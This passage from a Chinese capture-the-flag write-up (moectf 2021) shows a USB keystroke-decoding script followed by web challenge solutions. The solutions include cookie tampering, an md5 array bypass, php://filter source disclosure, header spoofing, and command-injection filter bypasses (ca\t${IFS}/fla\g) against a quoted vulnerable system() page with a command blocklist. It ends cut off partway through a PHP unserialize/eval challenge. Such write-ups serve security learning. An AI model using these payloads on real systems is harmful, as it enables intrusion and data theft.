class=\"token builtin class-name\">:</span><span class=\"token string\">\"@\"</span>, <span class=\"token string\">\"20\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"#\"</span>, <span class=\"token string\">\"21\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"$\"</span>,</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>          <span class=\"token string\">\"22\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"%\"</span>, <span class=\"token string\">\"23\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"^\"</span>,<span class=\"token string\">\"24\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&amp;\"</span>,<span class=\"token string\">\"25\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"*\"</span>,<span class=\"token string\">\"26\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"(\"</span>,<span class=\"token string\">\"27\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\")\"</span>,</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>          <span class=\"token string\">\"28\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;RET>\"</span>,<span class=\"token string\">\"29\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;ESC>\"</span>,<span class=\"token string\">\"2a\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;DEL>\"</span>, <span class=\"token string\">\"2b\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\t\">\\t</span>\"</span>,<span class=\"token string\">\"2c\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;SPACE>\"</span>,</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>          <span class=\"token string\">\"2d\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"_\"</span>,<span class=\"token string\">\"2e\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"+\"</span>,<span class=\"token string\">\"2f\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&#123;\"</span>,<span class=\"token string\">\"30\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&#125;\"</span>,<span class=\"token string\">\"31\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"|\"</span>,<span class=\"token string\">\"32\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;NON>\"</span>,<span class=\"token string\">\"33\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>\"</span>,</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>          <span class=\"token string\">\"34\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\":\"</span>,<span class=\"token string\">\"35\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;GA>\"</span>,<span class=\"token string\">\"36\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;\"</span>,<span class=\"token string\">\"37\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\">\"</span>,<span class=\"token string\">\"38\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"?\"</span>,<span class=\"token string\">\"39\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;CAP>\"</span>,<span class=\"token string\">\"3a\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F1>\"</span>,</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>          <span class=\"token string\">\"3b\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F2>\"</span>, <span class=\"token string\">\"3c\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F3>\"</span>,<span class=\"token string\">\"3d\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F4>\"</span>,<span class=\"token string\">\"3e\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F5>\"</span>,<span class=\"token string\">\"3f\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F6>\"</span>,<span class=\"token string\">\"40\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F7>\"</span>,</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>          <span class=\"token string\">\"41\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F8>\"</span>,<span class=\"token string\">\"42\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F9>\"</span>,<span class=\"token string\">\"43\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F10>\"</span>,<span class=\"token string\">\"44\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F11>\"</span>,<span class=\"token string\">\"45\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"&lt;F12>\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>output <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>keys <span class=\"token operator\">=</span> open<span class=\"token punctuation\">(</span><span class=\"token string\">'usbdata.txt'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">line</span> <span class=\"token keyword\">in</span> keys:</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    try:</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">if</span> line<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or <span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> and line<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string\">'0'</span> or line<span class=\"token punctuation\">[</span><span class=\"token number\">6</span>:8<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string\">\"00\"</span><span class=\"token builtin class-name\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>             <span class=\"token builtin class-name\">continue</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> line<span class=\"token punctuation\">[</span><span class=\"token number\">6</span>:8<span class=\"token punctuation\">]</span> <span class=\"token keyword\">in</span> normalKeys.keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>:</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            output <span class=\"token operator\">+=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span>normalKeys<span class=\"token punctuation\">[</span>line<span class=\"token punctuation\">[</span><span class=\"token number\">6</span>:8<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>,<span class=\"token punctuation\">[</span>shiftKeys<span class=\"token punctuation\">[</span>line<span class=\"token punctuation\">[</span><span class=\"token number\">6</span>:8<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>line<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        else:</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            output <span class=\"token operator\">+=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'[unknown]'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    except:</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        pass</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>keys.close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token assign-left variable\">flag</span><span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>print<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span>.join<span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">))</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">i</span> <span class=\"token keyword\">in</span> range<span class=\"token punctuation\">(</span>len<span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">))</span>:</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    try:</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token assign-left variable\">a</span><span class=\"token operator\">=</span>output.index<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;DEL>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        del output<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        del output<span class=\"token punctuation\">[</span>a-1<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    except:</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        pass</pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">i</span> <span class=\"token keyword\">in</span> range<span class=\"token punctuation\">(</span>len<span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">))</span>:</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    try:</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">if</span> output<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string\">\"&lt;CAP>\"</span><span class=\"token builtin class-name\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token assign-left variable\">flag</span><span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            output.pop<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token assign-left variable\">flag</span><span class=\"token operator\">==</span><span class=\"token number\">2</span>:</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                <span class=\"token assign-left variable\">flag</span><span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">if</span> flag<span class=\"token operator\">!=</span><span class=\"token number\">0</span>:</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            output<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>output<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>.upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    except:</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        pass</pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>print <span class=\"token punctuation\">(</span><span class=\"token string\">'output :'</span> + <span class=\"token string\">\"\"</span>.join<span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">))</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token comment\">## 结果 2021nian&lt;SPACE>8yue&lt;SPACE>5ri&lt;SPACE>,qing22&lt;DEL>&lt;RET>zuotian&lt;SPACE>gei&lt;SPACE>hanshu&lt;SPACE>fale&lt;SPACE>caotu&lt;SPACE>,cadai&lt;DEL>&lt;DEL>&lt;DEL>&lt;DEL>&lt;DEL>odaooo&lt;DEL>&lt;DEL>41tale&lt;SPACE>,kaixin&lt;SPACE>&lt;RET>yizhou&lt;SPACE>meiyoukan&lt;SPACE>jiaran=61de&lt;SPACE>shipinle&lt;SPACE>,nanshou&lt;SPACE>nie1&lt;RET>dongfangyaohe&lt;SPACE>musedash&lt;RET>liandongle&lt;SPACE>,shuangchukuangxi&lt;SPACE>[unknown][unknown]&lt;DEL>chu=2 [unknown][unknown]&lt;RET>moectf&lt;RET>de&lt;SPACE>misc&lt;RET>ti&lt;SPACE>caichule&lt;SPACE>4dao2,male&lt;SPACE>&lt;RET>woxiang&lt;SPACE>moyu2moyu&lt;SPACE>mou&lt;DEL>yu&lt;SPACE>&lt;RET>d&lt;DEL>&lt;GA>damedane\t&lt;RET>\\&lt;DEL>,&lt;RET>dameyo&lt;SPACE>&lt;RET>,&lt;RET>damenanoyo&lt;SPACE>&lt;RET>&lt;RET>xin2misc&lt;RET>ti&lt;SPACE>de&lt;SPACE>flag&lt;RET>xiangge3shengcao21yidiande&lt;SPACE>&lt;RET>jiujiao&lt;DEL>&lt;DEL>&lt;DEL>&lt;DEL>yo&lt;DEL>ng&lt;SPACE>&lt;SPACE>*moectf&lt;RET>&#123;&#125;[unknown] D@m3daNe_D4me_yoooooo*[unknown][unknown][unknown] haole&lt;DEL>&lt;DEL>&lt;DEL>&lt;DEL>&lt;DEL>&lt;SPACE>haole&lt;SPACE>riji&lt;SPACE>.&lt;DEL>.txt&lt;RET></span></pre></td></tr></table></figure><p><code>moectf&#123;D@m3daNe_D4me_yoooooo&#125;</code></p>\n<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"get\"><a class=\"anchor\" href=\"#get\">#</a> <strong>GET</strong></h2>\n<p>用 GET 获取<br />\n <code>http://47.93.215.154:10000/?moe=flag</code></p>\n<h2 id=\"post\"><a class=\"anchor\" href=\"#post\">#</a> <strong>POST</strong></h2>\n<p><code>Hackerbar</code>  发个 POST</p>\n<h2 id=\"cookie\"><a class=\"anchor\" href=\"#cookie\">#</a> <strong>Cookie</strong></h2>\n<p>页面显示 flag 只给 cookie，于是查看 cookie，发现其值为 0. 说明我不是 VIP！<br />\n于是修改其值为 1 于是 flag 就交给我了。<br />\n <code>moectf&#123;C00kie_1s_sw33t!&#125;</code></p>\n<h2 id=\"2048\"><a class=\"anchor\" href=\"#2048\">#</a> <strong>2048</strong></h2>\n<p>web 题下 js 类的题目，在游戏开始和结束时都会发送请求。开 bp！</p>\n<p><img data-src=\"https://i.loli.net/2021/09/21/gbu8cPvH3lyhSRZ.png\" alt=\"\" /></p>\n<p>传参指定参数即可</p>\n<p><img data-src=\"https://i.loli.net/2021/09/21/1sKfCVTO9hNyS67.png\" alt=\"\" /></p>\n<p>开游戏，抓包，乱玩，死了，找到包发到 repeater，分数一改，发过去，flag 就有啦。</p>\n<p><code>moectf&#123;2048_1s_intere5t1ng!&#125;</code></p>\n<h2 id=\"web_inc\"><a class=\"anchor\" href=\"#web_inc\">#</a> <strong>Web_Inc</strong></h2>\n<p>百度搜索:md5 绕过</p>\n<p><img data-src=\"https://i.loli.net/2021/09/21/DCytjM7OwfbKoAq.png\" alt=\"\" /></p>\n<p>题目要求是 a,b 不相等，但它们的 md5 值严格相等，&lt;font color='red'&gt; 注意是 =<mark> 而不是</mark> &lt;/font&gt;</p>\n<p>可以构造数组绕过， <code>a[]=1 b[]=2</code> , 传参得到 flag</p>\n<p><img data-src=\"https://i.loli.net/2021/09/21/blLWIVTosDG2YmF.png\" alt=\"\" /></p>\n<p>已知数组是不可哈希类型，而 md5 是基于哈希算法。所以 ab 赋为不同值数组，md5 之后都是 NULL 但值不同所以就过了。flag get！<br />\n <code>moectf&#123;xdsec3gf9dfg62fh342&#125;</code></p>\n<h2 id=\"ez_include\"><a class=\"anchor\" href=\"#ez_include\">#</a> <strong>ez_include</strong></h2>\n<p>此题用 php://input 传参发现没有反应，估计是 input 被屏蔽了，尝试使用 &lt;font color='red'&gt;filter&lt;/font &gt; 协议读取 flag.php 的源码，并用 base64 解密</p>\n<p><img data-src=\"https://i.loli.net/2021/09/21/HF2gSVjakIBxo73.png\" alt=\"\" /></p>\n<p><code>php://filter/read=convert.base64-encode/resource=flag.php``moectf&#123;xdsec6asdgas7ahfsfaxczc&#125;</code></p>\n<p>解密得到：&lt;?$flag=&quot;moectf {xdsec6asdgas7ahfsfaxczc}&quot;;?&gt;</p>\n<h2 id=\"do-your-know-http\"><a class=\"anchor\" href=\"#do-your-know-http\">#</a> <strong>Do your know http?</strong></h2>\n<p>这题考察的应该是对 HTTP 头的理解，采用 Burpsuite 抓包修改进行解题</p>\n<p>共有四关，1. 用 'HS' 来请求试试？改成 <code>HS</code></p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDkvMjEvbGY0TmVEdGh1SkFFYnB4LnBuZw==\">https://i.loli.net/2021/09/21/lf4NeDthuJAEbpx.png</span>&quot; alt=&quot;&quot;  /&gt;</p>\n<p>2. 用本地 ip 访问<br />\n <code>X-forwarded-for:127.0.0.1</code></p>\n<p><img data-src=\"https://i.loli.net/2021/09/21/bVkfSq4zwtA27XE.png\" alt=\"\" /></p>\n<p>3. 网页来源</p>\n<p><code>referer:www.ltyyds.com</code></p>\n<p><img data-src=\"https://i.loli.net/2021/09/21/HduOYyIQwqanFzU.png\" alt=\"\" /></p>\n<p>4. 伪造浏览器</p>\n<p><code>User-Agent: LT</code></p>\n<p><img data-src=\"https://i.loli.net/2021/09/21/Fr5QYVbjnRwShzq.png\" alt=\"\" /></p>\n<p><code>moectf&#123;HTTPHeaders_1s_s0_ea5y!&#125;</code></p>\n<h2 id=\"baberce\"><a class=\"anchor\" href=\"#baberce\">#</a> <strong>babeRCE</strong></h2>\n<blockquote>\n<p>参考博客<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMHlzdDNyLTIwNDYvcC8xMjYwMDA3My5odG1s\"> https://www.cnblogs.com/0yst3r-2046/p/12600073.html</span></p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$rce</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'rce'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rce</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\\;|[0-9]|\\*|\\`|\\%|\\>|\\&lt;|\\'|\\\"/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$rce</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rce</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hhhhhhacker!!!\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token operator\">**</span><span class=\"token constant\">FILE</span><span class=\"token operator\">**</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>审查代码看到<em> cat more less nl tac 等</em> 都被过滤了，ls 没被过滤，用 <code>burpsuite</code>  进行监控，重发</p>\n<p><code>?rce=ls</code></p>\n<p><code>find$&#123;IFS&#125;/$&#123;IFS&#125;-name$&#123;IFS&#125;fla\\g</code></p>\n<p>发现了 /flag 以及 index.php，<s>绝笔藏在 flag，但不能直接看，那就绕过</s></p>\n<p><code>?rce=ca\\t$&#123;IFS&#125;/fla\\g</code>  , 得到 flag</p>\n<p><code>moectf&#123;Do_y0u_l1k3_Rcccccccccccccce?&#125;</code></p>\n<h2 id=\"ezunserialize\"><a class=\"anchor\" href=\"#ezunserialize\">#</a> <strong>ezunserialize</strong></h2>\n<h3 id=\"-2\"><a class=\"anchor\" href=\"#-2\">#</a> </h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">entrance</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$start</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$start</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">start</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$start</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">start</span><span class=\"token operator\">-></span><span class=\"token function\">helloworld</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">springboard</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$middle</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arguments</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">middle</span><span class=\"token operator\">-></span><span class=\"token property\">hs</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">evil</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$end</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$end</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">end</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$end</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Attribute</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">end</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'serialize'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token function\">unserialize</span><span 